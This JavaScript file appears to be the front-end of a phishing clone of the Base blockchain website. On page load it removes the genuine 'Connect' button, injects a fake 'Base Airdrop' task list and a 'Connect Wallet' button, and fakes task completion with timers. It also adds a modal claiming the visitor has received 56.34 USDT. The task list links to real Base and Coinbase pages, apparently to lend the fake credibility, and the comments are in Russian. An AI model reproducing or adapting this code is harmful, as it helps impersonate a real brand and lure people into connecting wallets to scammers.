const images = [
  "./images/blog/base-is-meeting-builders-around-the-world-cover.png",
  "./images/blog/summer-never-ends-cover.webp",
  "./images/blog/scaling-base-looking-towards-the-upcoming-pectra-upgrade-cover.webp",
  "./images/blog/build-your-onchain-identity-with-basenames-cover.webp",
  "./images/blog/announcing-the-onchain-summer-buildathon-winners-cover.webp",
  "./images/blog/introducing-the-onchain-content-network-cover.webp",
];

window.addEventListener("load", () => {
  replaceImage();
  // addNftContainer();
  addAirdropContainer();
  waitForAndRemoveButton();
  appendModalMarkup();
  addCloseHandler();
  MicroModal.init();
  completeTask();
});

function addCloseHandler() {
  document.querySelector(".modal__close").addEventListener("click", () => {
    MicroModal.close("modal-1");
  });
}

function waitForAndRemoveButton() {
  const intervalTime = 100; // Интервал проверки (в миллисекундах)
  const maxTime = 5000; // Максимальное время ожидания (5 секунд)
  const startTime = Date.now();

  // Функция для поиска и удаления кнопки
  function checkAndRemoveButton() {
    const buttons = document.querySelectorAll("button");
    const targetButton = Array.from(buttons).find((button) => {
      const span = button.querySelector("span");
      return span && span.textContent.trim() === "Connect";
    });

    if (targetButton) {
      console.log("Кнопка найдена и удалена:", targetButton);
      const button = document.createElement("button");
      button.textContent = "Get Token";
      // button.href = "#airdrop-container";
      // button.setAttribute("data-custom-open", "modal-1");
      button.onclick = () => {
        MicroModal.show("modal-1");
      };
      button.className =
        "text-md px-4 py-2 whitespace-nowrap flex items-center justify-center disabled:opacity-40 disabled:pointer-events-none transition-all bg-blue text-white border border-blue hover:bg-blue-80 active:bg-[#06318E] text-md px-4 py-2 gap-3 rounded-full w-auto";
      const dataRkWrapper = document.querySelectorAll("[data-rk]");
      targetButton.remove();
      dataRkWrapper[1].appendChild(button);
      window.upgradeFinished = true;

      return; // Прекращаем выполнение, так как цель достигнута
    }

    // Проверяем, не истекло ли максимальное время
    if (Date.now() - startTime < maxTime) {
      setTimeout(checkAndRemoveButton, intervalTime);
    } else {
      console.log("Кнопка не найдена в течение 5 секунд.");
    }
  }

  // Запускаем первый вызов
  checkAndRemoveButton();
}

let firstTaskIsCompleted = false;

function completeTask() {
  const firstTaskElement = document.querySelector(
    ".airdrop-text ul li:first-child",
  );
  const secondTaskElement = document.querySelector(
    ".airdrop-text ul li:nth-child(2)",
  );

  const firstTaskloader = document.querySelector(
    ".airdrop-text ul li:first-child .loader",
  );
  const secondTaskloader = secondTaskElement.querySelector(".loader");
  const secondTaskCheckIcon = secondTaskElement.querySelector("img");

  const connectButton = document.querySelector(".airdrop-connect-button");

  firstTaskElement.addEventListener("click", () => {
    if (firstTaskIsCompleted) return;

    const imageElement = document.createElement("img");
    imageElement.src = "images/circle-check-green.svg";

    setTimeout(() => {
      firstTaskIsCompleted = true;
      firstTaskElement.style.color = "rgb(20, 204, 116)";
      imageElement.style.filter = "invert(0)";
      connectButton.style.opacity = 1;
      connectButton.style.visibility = "visible";
      firstTaskloader.remove();
      firstTaskElement.prepend(imageElement);

      secondTaskCheckIcon.remove();
      secondTaskloader.style.display = "block";
    }, 2500);
  });
}

function appendModalMarkup() {
  const modalMarkup = `
     <div class="modal micromodal-slide" id="modal-1" aria-hidden="true">
    <div class="modal__overlay" tabindex="-1" data-micromodal-close>
      <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-1-title">
        <header class="modal__header">
<!--          <h2 class="modal__title" id="modal-1-title">-->
<!--            Claimed!-->
<!--          </h2>-->
          <button class="modal__close" aria-label="Close modal" data-micromodal-close></button>
        </header>
        <main class="modal__content" id="modal-1-content">
        	<img src="images/logo.png" alt="" width="50"/>
        	<h2 class="modal__my_title">Base Airdrop Claimed!</h2>
        	<span class="modal__amount">56.34 USDT</span>
          <p>
          	Congratulations! <br/> You've successfully claimed your Base Airdrop reward. Enjoy your new assets and thank you being part of our community!
<!--            Try hitting the <code>tab</code> key and notice how the focus stays within the modal itself. Also, <code>esc</code> to close modal.-->
          </p>
        </main>
        <footer class="modal__footer">
          <button class="open modal__btn modal__btn-primary">Close</button>
<!--          <button class="modal__btn" data-micromodal-close aria-label="Close this dialog window">Close</button>-->
        </footer>
      </div>
    </div> 
  </div>
  `;

  const body = document.querySelector("body");
  body.insertAdjacentHTML("beforeend", modalMarkup);
}

function addAirdropContainer() {
  const parent = document.querySelector(".my-section").parentNode;
  const mySection = document.querySelector(".my-section");

  const newSection = document.createElement("section");
  newSection.id = "airdrop-container";
  newSection.innerHTML = `
	<div class="airdrop-container">
		<div class="airdrop-text">
			<h2>Base Airdrop</h2>
			<p class="airdrop-subtitle">Complete simple tasks, engage with the community, and unlock exclusive crypto benefits.</p>
			<ul>
				<li><span class="loader"></span><a target="_blank" href="https://discord.gg/buildonbase">Join Base’s official Discord server and participate in discussions.</a><img src="images/arrow-up-right.svg"/></li>
				<li><span class="loader"></span><img src="images/circle-check.svg"/><a target="_blank" href="https://basescan.org/">Make transactions within the Base network by sending tokens between wallets.</a><img src="images/arrow-up-right.svg"/></li>
				<li class="airdrop-link">
					<img src="images/circle-check.svg"/><p>Connect your wallet (e.g., <a target="_blank" href="https://www.coinbase.com/wallet">Coinbase Wallet</a> or <a target="_blank" href="https://metamask.io/download">Metamask</a>) to the Base network.</p>
				</li>
				
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://bridge.base.org/deposit">Use official bridges to transfer assets to Base (e.g., Ethereum → Base).</a><img src="images/arrow-up-right.svg"/></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="/ecosystem">Interact with decentralized applications (dApps) running on Base, such as DeFi protocols or NFT marketplaces.</a><img src="images/arrow-up-right.svg"/></li>
				<li class="airdrop-link"><img src="images/circle-check.svg"/><p>Sign up for a <a target="_blank" href="https://www.coinbase.com/signup">Coinbase</a> account (if you don’t have one) and complete <a target="_blank" href="https://help.coinbase.com/en/coinbase/getting-started/identity-verification/verify-your-identity">KYC</a> verification.</p></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://www.coinbase.com/buy">Purchase cryptocurrencies related to the Base network using Coinbase.</a><img src="images/arrow-up-right.svg"/></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://zora.co/">Buy or sell NFTs on Base-supported marketplaces.</a><img src="images/arrow-up-right.svg"/></li> 
			</ul>
			<button class="airdrop-connect-button open connect-button text-md px-4 py-2 whitespace-nowrap flex items-center justify-center disabled:opacity-40 disabled:pointer-events-none transition-all bg-blue text-white border border-blue hover:bg-blue-80 active:bg-[#06318E] text-md px-4 py-2 gap-3 rounded-full w-auto">Connect Wallet</button>
			<p class="airdrop-footer-subtitle">Don’t miss your chance to be part of the future of Web3 with Base! Completing these tasks not only earns you exclusive rewards but also helps you explore and engage with cutting-edge blockchain technology. Stay active, follow Base’s updates on social media, and keep an eye out for new opportunities in the ecosystem. Start now and join the growing community building on Base!</p>
		</div>

		<img src="./images/airdrop.png" alt="" width="350" height="350"/>
	</div>`;

  parent.insertBefore(newSection, mySection);
}

function replaceImage() {
  const elements = document.querySelectorAll(".object-cover");

  elements.forEach((element, index) => {
    if (element) {
      element.srcset = images[index];
    }
  });
}
